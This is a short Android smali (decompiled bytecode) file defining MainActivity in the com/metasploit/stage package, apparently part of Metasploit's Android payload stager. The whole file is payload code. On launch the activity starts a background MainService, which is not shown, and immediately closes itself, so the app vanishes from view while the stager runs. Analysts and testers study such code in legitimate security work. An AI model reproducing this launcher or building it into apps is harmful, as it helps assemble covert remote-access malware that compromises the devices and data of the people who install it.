.class public Lcom/metasploit/stage/MainActivity;
.super Landroid/app/Activity;


# direct methods
.method public constructor <init>()V
    .registers 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 2

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-static {p0}, Lcom/metasploit/stage/MainService;->startService(Landroid/content/Context;)V

    invoke-virtual {p0}, Lcom/metasploit/stage/MainActivity;->finish()V

    return-void
.end method
